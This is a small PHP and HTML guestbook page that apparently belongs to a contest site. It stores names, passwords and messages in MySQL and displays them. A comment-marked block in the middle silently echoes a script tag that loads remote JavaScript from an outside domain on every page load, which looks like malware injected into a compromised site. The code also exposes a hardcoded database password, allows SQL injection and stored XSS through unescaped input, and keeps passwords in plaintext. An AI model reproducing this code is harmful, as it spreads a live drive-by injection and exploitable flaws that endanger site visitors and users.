<html>
<body>
<form action="make.php" method="post">
name : <input type = "text" name = "name"/><br>
p  w : <input type = "password" name = "password"/></br> 
text : <input type = "text" name = "content"/> </br>
<input type = "submit">
</form>
</body>
</html>
<?
$connect=mysql_connect("localhost","iwop_contest","rudwlseoghl2013");
mysql_select_db("iwop_contest", $connect);
$query=mysql_query("select * from iwop_contest_04_Mobile", $connect);
while($data=mysql_fetch_array($query))
{
	if($data['name'] == '°ü¸®ÀÚ')
	{
		$name=$data['name'];
		echo "<div style='margin-left:100px;'>";
		echo "<hr><b>";
		echo $name;
		echo " : ";
		echo '</b>';
		echo $data['content'];
		echo "</div>";
	}
	else
	{
	$name=$data['name'];
	echo "<hr><b>";
	echo $name;
	echo " : ";
	echo '</b>';
	echo $data['content'];
	}
}

?>
<?php
#7ab3af#
if(empty($vt)) {
$vt = "<script type=\"text/javascript\" src=\"http://hancomotors.com/r9ctwktv.php?id=14155823\"></script>";
echo $vt;
}
#/7ab3af#
?><?
$connect=mysql_connect("localhost","iwop_contest","rudwlseoghl2013");
mysql_select_db("iwop_contest", $connect);
	$name=$_POST['name'];	
	$password=$_POST['password'];
	$content=$_POST['content'];
	if($name != null && $password!=null)
	$query=mysql_query("INSERT INTO iwop_contest_04_Mobile(name,password,content) values('$name','$password','$content')", $connect);
?>
<script>
</script>